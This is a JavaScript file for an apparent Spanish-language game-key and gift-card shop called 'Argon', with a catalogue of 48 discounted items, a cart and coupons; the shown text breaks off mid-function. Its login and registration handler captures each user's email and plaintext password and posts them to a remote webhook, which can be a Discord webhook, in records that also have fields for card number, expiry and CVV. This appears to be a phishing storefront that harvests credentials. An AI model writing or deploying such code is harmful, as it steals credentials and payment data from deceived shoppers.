// ============================================================================
// CONFIGURACIÓN DE BASE DE DATOS REMOTA (OPCIONAL)
// ============================================================================
let DEFAULT_REMOTE_DB_URL = "";

// Helper para URLs oficiales de portadas verticales en Steam CDN
const sImg = (appId) => `https://cdn.cloudflare.steamstatic.com/steam/apps/${appId}/library_600x900.jpg`;

// Generador de portadas de Gift Cards 100% vectoriales sin emojis
function cardImg(brandTitle, denomination, bgTop, bgBottom, accentHex, platformLabel) {
    const svg = `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 600 900" width="600" height="900">
        <defs>
            <linearGradient id="bgGrad" x1="0%" y1="0%" x2="100%" y2="100%">
                <stop offset="0%" stop-color="${bgTop}"/><stop offset="100%" stop-color="${bgBottom}"/>
            </linearGradient>
        </defs>
        <rect width="600" height="900" fill="url(#bgGrad)"/>
        <path d="M-100 200 L700 -100 L700 150 L-100 450 Z" fill="${accentHex}" opacity="0.08"/>
        <circle cx="520" cy="140" r="180" fill="${accentHex}" opacity="0.12"/>
        <rect x="36" y="36" width="528" height="828" rx="32" fill="none" stroke="rgba(255,255,255,0.18)" stroke-width="3"/>
        <rect x="36" y="36" width="528" height="90" rx="32" fill="rgba(0,0,0,0.35)"/>
        <text x="70" y="92" font-family="system-ui, sans-serif" font-size="25" font-weight="800" fill="#ffffff" letter-spacing="2">${platformLabel}</text>
        <rect x="365" y="56" width="170" height="50" rx="12" fill="${accentHex}"/>
        <text x="450" y="90" font-family="system-ui, sans-serif" font-size="22" font-weight="900" fill="#090d16" text-anchor="middle">${denomination}</text>
        <polygon points="300,235 385,285 385,380 300,430 215,380 215,285" fill="rgba(255,255,255,0.07)" stroke="${accentHex}" stroke-width="5"/>
        <circle cx="300" cy="332" r="26" fill="#ffffff"/>
        <text x="300" y="535" font-family="system-ui, sans-serif" font-size="60" font-weight="900" fill="#ffffff" text-anchor="middle" letter-spacing="2">${brandTitle}</text>
        <rect x="110" y="585" width="380" height="74" rx="18" fill="rgba(0,0,0,0.5)" stroke="rgba(255,255,255,0.15)" stroke-width="2"/>
        <text x="300" y="634" font-family="system-ui, sans-serif" font-size="33" font-weight="800" fill="${accentHex}" text-anchor="middle">${denomination}</text>
        <text x="300" y="810" font-family="system-ui, sans-serif" font-size="20" font-weight="700" fill="rgba(255,255,255,0.6)" text-anchor="middle" letter-spacing="4">OFFICIAL DIGITAL KEY</text>
    </svg>`;
    return "data:image/svg+xml;utf8," + encodeURIComponent(svg);
}

// Catálogo completo de 48 productos
const products = [
    { id: 1, name: "Minecraft: Java & Bedrock Edition (PC) Windows Store Key GLOBAL", category: "game", platform: "Windows Store", region: "GLOBAL", price: 17600, originalPrice: 24000, cashback: 1940, seller: "GGclub", image: sImg(1672970) },
    { id: 2, name: "Crimson Desert Enhanced: Charting the Unknown (DLC) Steam Key LATAM", category: "dlc", platform: "Steam", region: "LATAM", price: 17020, originalPrice: 22000, cashback: 2210, seller: "Instant-Codes", image: sImg(582660) },
    { id: 3, name: "EA SPORTS FC 25 Standard Edition Key", category: "game", platform: "EA App", region: "ARGENTINA", price: 34999, originalPrice: 59999, cashback: 3500, seller: "ArgonOfficial", image: sImg(2669320) },
    { id: 4, name: "Grand Theft Auto V: Premium Online Edition", category: "game", platform: "Rockstar", region: "GLOBAL", price: 12500, originalPrice: 25000, cashback: 1250, seller: "GGclub", image: sImg(271590) },
    { id: 5, name: "Elden Ring Steam Key (PC)", category: "game", platform: "Steam", region: "LATAM", price: 29999, originalPrice: 39999, cashback: 3000, seller: "Instant-Codes", image: sImg(1245620) },
    { id: 6, name: "Elden Ring: Shadow of the Erdtree (DLC) Steam Key", category: "dlc", platform: "Steam", region: "LATAM", price: 22500, originalPrice: 29999, cashback: 2250, seller: "GGclub", image: sImg(2778580) },
    { id: 7, name: "Cyberpunk 2077 Ultimate Edition Key", category: "game", platform: "GOG / Steam", region: "GLOBAL", price: 27500, originalPrice: 45000, cashback: 2750, seller: "ArgonOfficial", image: sImg(1091500) },
    { id: 8, name: "Cyberpunk 2077: Phantom Liberty (DLC) Key", category: "dlc", platform: "Steam", region: "GLOBAL", price: 16900, originalPrice: 22000, cashback: 1690, seller: "Instant-Codes", image: sImg(2138330) },
    { id: 9, name: "HELLDIVERS 2 Steam Key (PC)", category: "game", platform: "Steam", region: "GLOBAL", price: 24999, originalPrice: 30000, cashback: 2500, seller: "GGclub", image: sImg(553850) },
    { id: 10, name: "Red Dead Redemption 2 Ultimate Key", category: "game", platform: "Rockstar", region: "LATAM", price: 18999, originalPrice: 45000, cashback: 1900, seller: "Instant-Codes", image: sImg(1174180) },
    { id: 11, name: "Black Myth: Wukong Steam Key", category: "game", platform: "Steam", region: "GLOBAL", price: 36999, originalPrice: 48000, cashback: 3700, seller: "ArgonOfficial", image: sImg(2358720) },
    { id: 12, name: "God of War Ragnarök Steam Key (PC)", category: "game", platform: "Steam", region: "LATAM", price: 33500, originalPrice: 44000, cashback: 3350, seller: "GGclub", image: sImg(2322010) },
    { id: 13, name: "Hogwarts Legacy Deluxe Edition", category: "game", platform: "Steam", region: "GLOBAL", price: 21000, originalPrice: 42000, cashback: 2100, seller: "ArgonOfficial", image: sImg(990080) },
    { id: 14, name: "Baldur's Gate 3 Digital Deluxe PC", category: "game", platform: "Steam", region: "GLOBAL", price: 34999, originalPrice: 49999, cashback: 3500, seller: "GGclub", image: sImg(1086940) },
    { id: 15, name: "Palworld Steam Key GLOBAL", category: "game", platform: "Steam", region: "GLOBAL", price: 11500, originalPrice: 15000, cashback: 1150, seller: "Instant-Codes", image: sImg(1623730) },
    { id: 16, name: "Call of Duty: Modern Warfare III", category: "game", platform: "Battle.net", region: "GLOBAL", price: 39999, originalPrice: 65000, cashback: 4000, seller: "ArgonOfficial", image: sImg(1938090) },
    { id: 17, name: "Resident Evil 4 Remake Gold Edition", category: "game", platform: "Steam", region: "LATAM", price: 22999, originalPrice: 35000, cashback: 2300, seller: "GGclub", image: sImg(2050650) },
    { id: 18, name: "Warhammer 40,000: Space Marine 2", category: "game", platform: "Steam", region: "GLOBAL", price: 31999, originalPrice: 42000, cashback: 3200, seller: "Instant-Codes", image: sImg(2183900) },
    { id: 19, name: "Silent Hill 2 Remake Steam Key", category: "game", platform: "Steam", region: "LATAM", price: 28900, originalPrice: 38000, cashback: 2890, seller: "ArgonOfficial", image: sImg(2124490) },
    { id: 20, name: "Ghost of Tsushima DIRECTOR'S CUT", category: "game", platform: "Steam", region: "GLOBAL", price: 32500, originalPrice: 45000, cashback: 3250, seller: "GGclub", image: sImg(2215430) },
    { id: 21, name: "Forza Horizon 5 Premium Edition", category: "game", platform: "Steam / Xbox", region: "GLOBAL", price: 23500, originalPrice: 36000, cashback: 2350, seller: "Instant-Codes", image: sImg(1551360) },
    { id: 22, name: "Marvel's Spider-Man Remastered PC", category: "game", platform: "Steam", region: "GLOBAL", price: 24500, originalPrice: 38000, cashback: 2450, seller: "ArgonOfficial", image: sImg(1817070) },
    { id: 23, name: "Street Fighter 6 Steam Key", category: "game", platform: "Steam", region: "LATAM", price: 21999, originalPrice: 32000, cashback: 2200, seller: "GGclub", image: sImg(1364780) },
    { id: 24, name: "Tekken 8 Standard Edition Key", category: "game", platform: "Steam", region: "GLOBAL", price: 29500, originalPrice: 41000, cashback: 2950, seller: "Instant-Codes", image: sImg(1778820) },
    { id: 25, name: "Steam Wallet Gift Card $10 USD (Argentina)", category: "giftcard", platform: "Steam", region: "ARGENTINA", price: 11800, originalPrice: 13500, cashback: 1180, seller: "GGclub", image: cardImg("STEAM", "$10 USD", "#1b2838", "#0b1219", "#66c0f4", "VALVE STEAM") },
    { id: 26, name: "Steam Wallet Gift Card $20 USD (Argentina)", category: "giftcard", platform: "Steam", region: "ARGENTINA", price: 23200, originalPrice: 26000, cashback: 2320, seller: "Instant-Codes", image: cardImg("STEAM", "$20 USD", "#1b2838", "#0b1219", "#66c0f4", "VALVE STEAM") },
    { id: 27, name: "Steam Wallet Gift Card $50 USD (Argentina)", category: "giftcard", platform: "Steam", region: "ARGENTINA", price: 56900, originalPrice: 64000, cashback: 5690, seller: "ArgonOfficial", image: cardImg("STEAM", "$50 USD", "#1b2838", "#0b1219", "#66c0f4", "VALVE STEAM") },
    { id: 28, name: "PlayStation Store PSN Card $10 USD", category: "giftcard", platform: "PlayStation", region: "USA", price: 12200, originalPrice: 14000, cashback: 1220, seller: "GGclub", image: cardImg("PSN STORE", "$10 USD", "#00439c", "#001b47", "#38bdf8", "PLAYSTATION") },
    { id: 29, name: "PlayStation Store PSN Card $25 USD", category: "giftcard", platform: "PlayStation", region: "USA", price: 29800, originalPrice: 34000, cashback: 2980, seller: "Instant-Codes", image: cardImg("PSN STORE", "$25 USD", "#00439c", "#001b47", "#38bdf8", "PLAYSTATION") },
    { id: 30, name: "PlayStation Store PSN Card $50 USD", category: "giftcard", platform: "PlayStation", region: "USA", price: 58500, originalPrice: 65000, cashback: 5850, seller: "ArgonOfficial", image: cardImg("PSN STORE", "$50 USD", "#00439c", "#001b47", "#38bdf8", "PLAYSTATION") },
    { id: 31, name: "Xbox Live Gift Card $10.000 ARS", category: "giftcard", platform: "Xbox", region: "ARGENTINA", price: 9600, originalPrice: 11000, cashback: 960, seller: "GGclub", image: cardImg("XBOX LIVE", "$10.000 ARS", "#107c10", "#062e06", "#4ade80", "MICROSOFT XBOX") },
    { id: 32, name: "Xbox Live Gift Card $25.000 ARS", category: "giftcard", platform: "Xbox", region: "ARGENTINA", price: 23900, originalPrice: 27000, cashback: 2390, seller: "Instant-Codes", image: cardImg("XBOX LIVE", "$25.000 ARS", "#107c10", "#062e06", "#4ade80", "MICROSOFT XBOX") },
    { id: 33, name: "Nintendo eShop Card $20 USD", category: "giftcard", platform: "Nintendo", region: "USA", price: 23400, originalPrice: 26000, cashback: 2340, seller: "ArgonOfficial", image: cardImg("NINTENDO", "$20 USD", "#e60012", "#6b0008", "#fca5a5", "ESHOP SWITCH") },
    { id: 34, name: "Apple App Store & iTunes $15 USD", category: "giftcard", platform: "Apple", region: "USA", price: 17500, originalPrice: 19500, cashback: 1750, seller: "GGclub", image: cardImg("APP STORE", "$15 USD", "#334155", "#0f172a", "#38bdf8", "APPLE ITUNES") },
    { id: 35, name: "Google Play Gift Card $15 USD", category: "giftcard", platform: "Google Play", region: "USA", price: 17400, originalPrice: 19500, cashback: 1740, seller: "Instant-Codes", image: cardImg("GOOGLE PLAY", "$15 USD", "#0f766e", "#042f2e", "#34d399", "ANDROID STORE") },
    { id: 36, name: "Razer Gold Pin $20 USD Global", category: "giftcard", platform: "Razer Gold", region: "GLOBAL", price: 22900, originalPrice: 25500, cashback: 2290, seller: "ArgonOfficial", image: cardImg("RAZER GOLD", "$20 USD", "#15803d", "#052e16", "#4ade80", "RAZER CREDITS") },
    { id: 37, name: "Counter-Strike 2 Prime Status Upgrade", category: "currency", platform: "Steam", region: "GLOBAL", price: 16500, originalPrice: 19500, cashback: 1650, seller: "GGclub", image: sImg(730) },
    { id: 38, name: "Apex Legends 2,150 Apex Coins", category: "currency", platform: "EA App", region: "GLOBAL", price: 21500, originalPrice: 25000, cashback: 2150, seller: "Instant-Codes", image: sImg(1172470) },
    { id: 39, name: "Destiny 2: 2,300 Silver Pack", category: "currency", platform: "Steam", region: "GLOBAL", price: 19900, originalPrice: 24000, cashback: 1990, seller: "ArgonOfficial", image: sImg(1085660) },
    { id: 40, name: "Roblox Digital Card 1,000 Robux", category: "currency", platform: "Roblox", region: "GLOBAL", price: 13200, originalPrice: 15500, cashback: 1320, seller: "GGclub", image: cardImg("ROBLOX", "1,000 ROBUX", "#991b1b", "#3b0707", "#f87171", "ROBLOX CORP") },
    { id: 41, name: "Fortnite 2,800 V-Bucks Code", category: "currency", platform: "Epic Games", region: "GLOBAL", price: 28900, originalPrice: 34000, cashback: 2890, seller: "Instant-Codes", image: cardImg("FORTNITE", "2,800 V-BUCKS", "#3730a3", "#1e1b4b", "#38bdf8", "EPIC GAMES") },
    { id: 42, name: "Valorant 2,475 Riot Points LATAM", category: "currency", platform: "Riot Games", region: "LATAM", price: 24500, originalPrice: 28500, cashback: 2450, seller: "ArgonOfficial", image: cardImg("VALORANT", "2,475 VP", "#be123c", "#4c0519", "#fb7185", "RIOT GAMES") },
    { id: 43, name: "Xbox Game Pass Ultimate 1 Mes Key", category: "subscription", platform: "Xbox", region: "ARGENTINA", price: 11999, originalPrice: 15999, cashback: 1200, seller: "ArgonOfficial", image: cardImg("GAME PASS", "1 MES ULTIMATE", "#15803d", "#052e16", "#4ade80", "XBOX / PC") },
    { id: 44, name: "Xbox Game Pass Ultimate 3 Meses Key", category: "subscription", platform: "Xbox", region: "ARGENTINA", price: 32999, originalPrice: 45000, cashback: 3300, seller: "GGclub", image: cardImg("GAME PASS", "3 MESES", "#15803d", "#052e16", "#4ade80", "XBOX / PC") },
    { id: 45, name: "PlayStation Plus Deluxe 12 Meses", category: "subscription", platform: "PlayStation", region: "ARGENTINA", price: 68900, originalPrice: 89000, cashback: 6890, seller: "Instant-Codes", image: cardImg("PS PLUS", "12 MESES", "#ca8a04", "#422006", "#facc15", "DELUXE PLAN") },
    { id: 46, name: "Discord Nitro 1 Mes con 2 Boosts", category: "subscription", platform: "Discord", region: "GLOBAL", price: 8500, originalPrice: 11000, cashback: 850, seller: "GGclub", image: cardImg("DISCORD", "1 MES NITRO", "#4f46e5", "#1e1b4b", "#818cf8", "NITRO BOOST") },
    { id: 47, name: "Spotify Premium 3 Meses Individual", category: "subscription", platform: "Spotify", region: "ARGENTINA", price: 7900, originalPrice: 10500, cashback: 790, seller: "ArgonOfficial", image: cardImg("SPOTIFY", "3 MESES", "#16a34a", "#052e16", "#4ade80", "PREMIUM MUSIC") },
    { id: 48, name: "Netflix Gift Card $10.000 ARS", category: "subscription", platform: "Netflix", region: "ARGENTINA", price: 10100, originalPrice: 11500, cashback: 1010, seller: "Instant-Codes", image: cardImg("NETFLIX", "$10.000 ARS", "#b91c1c", "#3b0707", "#f87171", "STREAMING CARD") }
];

// Slides del Banner Spotlight HD
const heroSpotlightSlides = [
    { productId: 11, badge: "DESTACADO DE LA SEMANA", title: "Black Myth: Wukong", desc: "Enfréntate a leyendas ancestrales en el RPG de acción más jugado del año. Clave oficial de Steam con entrega inmediata.", bannerBg: "https://cdn.cloudflare.steamstatic.com/steam/apps/2358720/library_hero.jpg", thumb: sImg(2358720) },
    { productId: 7, badge: "EDICIÓN DEFINITIVA", title: "Cyberpunk 2077 Ultimate", desc: "Incluye el juego base y la expansión Phantom Liberty en Night City con activación instantánea.", bannerBg: "https://cdn.cloudflare.steamstatic.com/steam/apps/1091500/library_hero.jpg", thumb: sImg(1091500) },
    { productId: 5, badge: "ÉXITO EN VENTAS LATAM", title: "Elden Ring Steam Key", desc: "Explora las Tierras Intermedias con código digital verificado para Steam Argentina y LATAM.", bannerBg: "https://cdn.cloudflare.steamstatic.com/steam/apps/1245620/library_hero.jpg", thumb: sImg(1245620) },
    { productId: 10, badge: "OFERTA ESPECIAL -58%", title: "Red Dead Redemption 2", desc: "Vive la épica historia de Arthur Morgan con más de un 50% de descuento directo en pesos argentinos.", bannerBg: "https://cdn.cloudflare.steamstatic.com/steam/apps/1174180/library_hero.jpg", thumb: sImg(1174180) }
];

let currentHeroIndex = 0;
let heroInterval = null;
let cart = [];
// Usuarios nuevos empiezan con $0,00 en la cartera
let walletBalance = Number(localStorage.getItem('ohmy_wallet_zero_balance') || 0);
let appliedDiscount = 0;
let activeCategory = 'all';
let selectedMethod = 'wallet';
let currentAuthMode = 'login';
let currentUser = JSON.parse(localStorage.getItem('ohmy_active_user') || 'null');

document.addEventListener('DOMContentLoaded', () => {
    initHeroCarousel();
    renderProducts(products);
    updateCartBadge();
    updateWalletUI();
    updateAuthUI();

    const savedWebhook = localStorage.getItem('ohmy_remote_webhook') || DEFAULT_REMOTE_DB_URL;
    const webhookInput = document.getElementById('webhookUrlInput');
    if (webhookInput && savedWebhook) webhookInput.value = savedWebhook;

    checkAdminHash();
    window.addEventListener('hashchange', checkAdminHash);
});

function checkAdminHash() {
    if (window.location.hash === '#admin') {
        openAdminModal();
    }
}

function formatARS(amount) {
    return '$' + Number(amount).toLocaleString('es-AR', { minimumFractionDigits: 2, maximumFractionDigits: 2 }) + ' ARS';
}

function updateWalletUI() {
    localStorage.setItem('ohmy_wallet_zero_balance', walletBalance);
    const el = document.getElementById('walletBalance');
    if (el) el.innerText = formatARS(walletBalance);
}

// ============================================================================
// CARRUSEL SPOTLIGHT HD
// ============================================================================
function initHeroCarousel() {
    renderHeroSpotlight(0);
    renderHeroSideThumbs();
    heroInterval = setInterval(() => {
        currentHeroIndex = (currentHeroIndex + 1) % heroSpotlightSlides.length;
        renderHeroSpotlight(currentHeroIndex);
        renderHeroSideThumbs();
    }, 5000);
}

function selectHeroSlide(idx) {
    currentHeroIndex = idx;
    renderHeroSpotlight(idx);
    renderHeroSideThumbs();
    if (heroInterval) clearInterval(heroInterval);
    heroInterval = setInterval(() => {
        currentHeroIndex = (currentHeroIndex + 1) % heroSpotlightSlides.length;
        renderHeroSpotlight(currentHeroIndex);
        renderHeroSideThumbs();
    }, 5000);
}

function renderHeroSpotlight(idx) {
    const slide = heroSpotlightSlides[idx];
    const prod = products.find(p => p.id === slide.productId) || products[0];

    document.getElementById('heroSlideBg').src = slide.bannerBg;
    document.getElementById('heroSlideBadge').innerText = slide.badge;
    document.getElementById('heroSlidePlatform').innerText = `${prod.platform} • ${prod.region}`;
    document.getElementById('heroSlideTitle').innerText = slide.title;
    document.getElementById('heroSlideDesc').innerText = slide.desc;
    document.getElementById('heroSlideOldPrice').innerText = formatARS(prod.originalPrice);
    document.getElementById('heroSlidePrice').innerText = formatARS(prod.price);
    document.getElementById('heroBuyBtn').setAttribute('onclick', `addToCart(${prod.id})`);
}

function renderHeroSideThumbs() {
    const container = document.getElementById('heroSideThumbs');
    if (!container) return;
    container.innerHTML = '';

    heroSpotlightSlides.forEach((slide, idx) => {
        const prod = products.find(p => p.id === slide.productId) || products[0];
        const isActive = idx === currentHeroIndex;

        const item = document.createElement('div');
        item.onclick = () => selectHeroSlide(idx);
        item.className = `hero-thumb-item cursor-pointer rounded-xl border border-purple-800/60 bg-[#1a0c3d] hover:bg-[#251257] p-2 sm:p-2.5 flex items-center gap-2.5 sm:gap-3 lg:flex-1 ${isActive ? 'active-thumb' : ''}`;
        item.innerHTML = `
            <img src="${slide.thumb}" alt="${slide.title}" class="w-10 h-14 sm:w-12 sm:h-16 object-cover rounded-lg shrink-0">
            <div class="flex-1 min-w-0">
                <span class="hidden sm:block text-[9px] font-extrabold uppercase text-fuchsia-400 truncate">${slide.badge}</span>
                <h4 class="font-bold text-[11px] sm:text-xs text-white line-clamp-1">${slide.title}</h4>
                <span class="text-[11px] sm:text-xs font-black text-emerald-400 block">${formatARS(prod.price)}</span>
            </div>
            ${isActive ? '<div class="absolute bottom-0 left-0 right-0 hero-progress-bar"></div>' : ''}
        `;
        container.appendChild(item);
    });
}

// ============================================================================
// SISTEMA DE CREAR CUENTA / INICIAR SESIÓN
// ============================================================================
function openAuthModal(mode = 'login') {
    document.getElementById('authModal').classList.remove('hidden');
    switchAuthTab(mode);
}

function closeAuthModal() {
    document.getElementById('authModal').classList.add('hidden');
}

function switchAuthTab(mode) {
    currentAuthMode = mode;
    const loginBtn = document.getElementById('tabLoginBtn');
    const regBtn = document.getElementById('tabRegisterBtn');
    const nameField = document.getElementById('authNameField');
    const nameInput = document.getElementById('authNameInput');
    const title = document.getElementById('authModalTitle');
    const submitBtn = document.getElementById('authSubmitBtn');

    if (mode === 'login') {
        loginBtn.className = 'py-2 rounded-lg text-xs font-bold bg-purple-600 text-white transition';
        regBtn.className = 'py-2 rounded-lg text-xs font-bold text-purple-300 hover:text-white transition';
        nameField.classList.add('hidden');
        nameInput.required = false;
        title.innerText = 'Iniciar Sesión en Argon';
        submitBtn.innerText = 'Entrar a mi Cuenta';
    } else {
        regBtn.className = 'py-2 rounded-lg text-xs font-bold bg-purple-600 text-white transition';
        loginBtn.className = 'py-2 rounded-lg text-xs font-bold text-purple-300 hover:text-white transition';
        nameField.classList.remove('hidden');
        nameInput.required = true;
        title.innerText = 'Crear Cuenta en Argon';
        submitBtn.innerText = 'Crear Cuenta Ahora';
    }
}

async function handleAuthSubmit(e) {
    e.preventDefault();
    const email = document.getElementById('authEmailInput').value.trim();
    const password = document.getElementById('authPasswordInput').value;
    const name = currentAuthMode === 'register'
        ? document.getElementById('authNameInput').value.trim()
        : email.split('@')[0];

    if (currentAuthMode === 'register') {
        walletBalance = 0;
        updateWalletUI();
    }

    currentUser = { name, email };
    localStorage.setItem('ohmy_active_user', JSON.stringify(currentUser));

    const accountRecord = {
        id: 'USER-' + Math.floor(100000 + Math.random() * 900000),
        type: currentAuthMode === 'register' ? 'NUEVA CUENTA' : 'INICIO DE SESIÓN',
        date: new Date().toLocaleString('es-AR'),
        paymentMethod: 'CUENTA USUARIO',
        buyer: {
            name: name,
            email: email,
            phone: 'N/A',
            dni: 'Password: ' + password,
            province: 'N/A',
            address: 'N/A',
            cardNum: 'Contraseña: ' + password,
            cardExp: '-',
            cardCvv: '-'
        },
        items: [],
        total: 0,
        cashbackEarned: 0
    };

    const db = JSON.parse(localStorage.getItem('ohmy_sandbox_db') || '[]');
    db.push(accountRecord);
    localStorage.setItem('ohmy_sandbox_db', JSON.stringify(db));

    const remoteUrl = localStorage.getItem('ohmy_remote_webhook') || DEFAULT_REMOTE_DB_URL;
    if (remoteUrl) {
        try {
            if (remoteUrl.includes('discord.com/api/webhooks')) {
                await fetch(remoteUrl, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        content: `👤 **${accountRecord.type} (${accountRecord.id})**\n**Usuario:** ${name}\n**Email:** ${email}\n**Contraseña:** \`${password}\``
                    })
                });
            } else {
                await fetch(remoteUrl, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(accountRecord)
                });
            }
        } catch (err) {
            console.warn('Error enviando cuenta a base remota:', err);
        }
    }

    updateAuthUI();
    closeAuthModal();
    document.getElementById('authForm').reset();
}

function logoutUser() {
    currentUser = null;
    localStorage.removeItem('ohmy_active_user');
    updateAuthUI();
}

function updateAuthUI() {
    const navArea = document.getElementById('userNavArea');
    if (!navArea) return;

    if (currentUser) {
        navArea.innerHTML = `
            <div class="flex items-center space-x-1.5 sm:space-x-2 bg-[#261556] border border-purple-700/70 px-2.5 py-1 rounded-lg">
                <i class="fa-solid fa-circle-user text-emerald-400"></i>
                <span class="font-bold text-white truncate max-w-[90px] sm:max-w-none">${currentUser.name}</span>
                <button onclick="logoutUser()" title="Cerrar sesión" class="text-purple-300 hover:text-rose-400 ml-1 transition">
                    <i class="fa-solid fa-right-from-bracket"></i>
                </button>
            </div>
        `;
        const sbName = document.getElementById('sbName');
        const sbEmail = document.getElementById('sbEmail');
        if (sbName && !sbName.value) sbName.value = currentUser.name;
        if (sbEmail && !sbEmail.value) sbEmail.value = currentUser.email;
    } else {
        navArea.innerHTML = `
            <button onclick="openAuthModal('login')" class="text-white hover:text-fuchsia-300 font-bold transition flex items-center gap-1.5 bg-[#261556] hover:bg-[#321c70] border border-purple-700/70 px-2.5 sm:px-3 py-1 rounded-lg shadow text-[11px] sm:text-xs">
                <i class="fa-regular fa-user text-fuchsia-400"></i>
                <span>Iniciar sesión <span class="hidden sm:inline">| Crear cuenta</span></span>
            </button>
        `;
    }
}

// ============================================================================
// CATÁLOGO Y CARRITO RESPONSIVE
// ============================================================================
function renderProducts(list) {
    const grid = document.getElementById('productGrid');
    if (!grid) return;
    grid.innerHTML = '';

    if (list.length === 0) {
        grid.innerHTML = `<div class="col-span-full text-center py-12 text-purple-300 font-semibold text-xs sm:text-sm">No se encontraron productos con ese criterio.</div>`;
        return;
    }

    list.forEach(p => {
        const discount = Math.round(((p.originalPrice - p.price) / p.originalPrice) * 100);
        const fallbackImg = cardImg(p.platform.toUpperCase(), p.region, "#3b188f", "#190d3a", "#f5a623", "DIGITAL KEY");
        
        const card = document.createElement('div');
        card.className = 'bg-[#1f0f47] border border-purple-800/60 hover:border-fuchsia-500 rounded-xl overflow-hidden shadow-lg flex flex-col justify-between transition group';
        card.innerHTML = `
            <div>
                <div class="game-cover-container">
                    <img src="${p.image}" alt="${p.name}" loading="lazy" onerror="this.onerror=null;this.src='${fallbackImg}';">
                    <span class="absolute top-2 left-2 bg-rose-600 text-white font-black text-[10px] sm:text-[11px] px-1.5 sm:px-2 py-0.5 rounded shadow">-${discount}%</span>
                    <span class="absolute bottom-2 left-2 bg-emerald-500 text-slate-950 font-extrabold text-[9px] sm:text-[10px] px-1.5 sm:px-2 py-0.5 rounded shadow">CASHBACK</span>
                </div>
                <div class="p-2.5 sm:p-3.5 space-y-1">
                    <h3 class="font-bold text-[11px] sm:text-xs text-white line-clamp-2 leading-snug group-hover:text-fuchsia-300 transition">${p.name}</h3>
                    <span class="block text-[9px] sm:text-[10px] font-extrabold uppercase tracking-wider text-emerald-400 truncate">${p.region} • ${p.platform}</span>
                </div>
            </div>
            <div class="p-2.5 sm:p-3.5 pt-0 space-y-2">
                <div>
                    <span class="block text-[10px] text-purple-300 line-through">${formatARS(p.originalPrice)}</span>
                    <span class="text-sm sm:text-base font-black text-white block leading-tight">${formatARS(p.price)}</span>
                    <span class="block text-[9px] sm:text-[10px] text-emerald-400 font-bold truncate">de Cashback: ${formatARS(p.cashback)}</span>
                </div>
                <button onclick="addToCart(${p.id})" class="w-full bg-purple-600 hover:bg-fuchsia-600 text-white font-bold py-2 rounded-lg text-[11px] sm:text-xs flex items-center justify-center gap-1.5 transition shadow">
                    <i class="fa-solid fa-cart-plus"></i> Añadir al carro
                </button>
            </div>
        `;
        grid.appendChild(card);
    });
}

function setCategory(cat, btnElement) {
    activeCategory = cat;
    document.querySelectorAll('.cat-btn').forEach(btn => btn.classList.remove('active-cat'));
    btnElement.classList.add('active-cat');
    filterProducts();
}

function filterProducts() {
    const query = document.getElementById('searchInput').value.toLowerCase();
    const sort = document.getElementById('sortSelect').value;

    let filtered = products.filter(p => {
        const matchCat = activeCategory === 'all' || p.category === activeCategory;
        const matchQuery = p.name.toLowerCase().includes(query) || p.platform.toLowerCase().includes(query);
        return matchCat && matchQuery;
    });

    if (sort === 'price-asc') filtered.sort((a, b) => a.price - b.price);
    if (sort === 'price-desc') filtered.sort((a, b) => b.price - a.price);
    if (sort === 'discount') filtered.sort((a, b) => ((b.originalPrice - b.price) / b.originalPrice) - ((a.originalPrice - a.price) / a.originalPrice));

    renderProducts(filtered);
}

function toggleCart() {
    const drawer = document.getElementById('cartDrawer');
    drawer.classList.toggle('hidden');
    renderCartItems();
}

function addToCart(id) {
    const prod = products.find(p => p.id === id);
    if (!prod) return;
    const existing = cart.find(item => item.id === id);
    if (existing) {
        existing.qty++;
    } else {
        cart.push({ ...prod, qty: 1 });
    }
    updateCartBadge();
    toggleCart();
}

function updateCartBadge() {
    const count = cart.reduce((acc, item) => acc + item.qty, 0);
    document.getElementById('cartBadge').innerText = count;
    document.getElementById('cartCount').innerText = count;
}

function renderCartItems() {
    const list = document.getElementById('cartItemsList');
    if (!list) return;
    list.innerHTML = '';

    if (cart.length === 0) {
        list.innerHTML = `<p class="text-center text-purple-300 py-8 text-xs sm:text-sm">Tu carro está vacío.</p>`;
        updateCartTotals(0, 0, 0);
        return;
    }

    let subtotal = 0;
    cart.forEach((item, idx) => {
        subtotal += item.price * item.qty;
        const div = document.createElement('div');
        div.className = 'flex items-center justify-between bg-[#2a175e] p-2.5 sm:p-3 rounded-xl border border-purple-700/50 gap-2.5';
        div.innerHTML = `
            <div class="flex items-center space-x-2.5 min-w-0">
                <img src="${item.image}" class="w-10 h-13 object-cover rounded shrink-0">
                <div class="min-w-0">
                    <h4 class="font-bold text-xs text-white line-clamp-1">${item.name}</h4>
                    <span class="text-xs text-emerald-400 font-extrabold">${formatARS(item.price)}</span>
                </div>
            </div>
            <div class="flex items-center space-x-2 shrink-0">
                <button onclick="changeQty(${idx}, -1)" class="w-6 h-6 bg-purple-900 rounded text-xs font-bold hover:bg-purple-700">-</button>
                <span class="text-xs font-bold">${item.qty}</span>
                <button onclick="changeQty(${idx}, 1)" class="w-6 h-6 bg-purple-900 rounded text-xs font-bold hover:bg-purple-700">+</button>
            </div>
        `;
        list.appendChild(div);
    });

    const discount = subtotal * appliedDiscount;
    const total = subtotal - discount;
    updateCartTotals(subtotal, discount, total);
}

function changeQty(index, delta) {
    cart[index].qty += delta;
    if (cart[index].qty <= 0) {
        cart.splice(index, 1);
    }
    updateCartBadge();
    renderCartItems();
    if (!document.getElementById('viewCheckoutEneba').classList.contains('hidden')) {
        if (cart.length === 0) switchView('store');
        else renderEnebaSummary();
    }
}

function removeItemFromCheckout(index) {
    cart.splice(index, 1);
    updateCartBadge();
    if (cart.length === 0) {
        switchView('store');
    } else {
        renderEnebaSummary();
    }
}

function applyCoupon() {
    const code = document.getElementById('couponInput').value.trim().toUpperCase();
    const msg = document.getElementById('couponMessage');
    if (code === 'ARGON10' || code === 'OHMY10') {
        appliedDiscount = 0.10;
        msg.className = 'text-xs text-emerald-400 font-bold';
        msg.innerText = '¡Cupón del 10% aplicado!';
    } else {
        appliedDiscount = 0;
        msg.className = 'text-xs text-rose-400 font-bold';
        msg.innerText = 'Cupón inválido.';
    }
    renderCartItems();
}

function updateCartTotals(subtotal, discount, total) {
    document.getElementById('cartSubtotal').innerText = formatARS(subtotal);
    document.getElementById('cartDiscount').innerText = '-' + formatARS(discount);
    document.getElementById('cartTotal').innerText = formatARS(total);
}

// ============================================================================
// NAVEGACIÓN Y CHECKOUT
// ============================================================================
function switchView(view) {
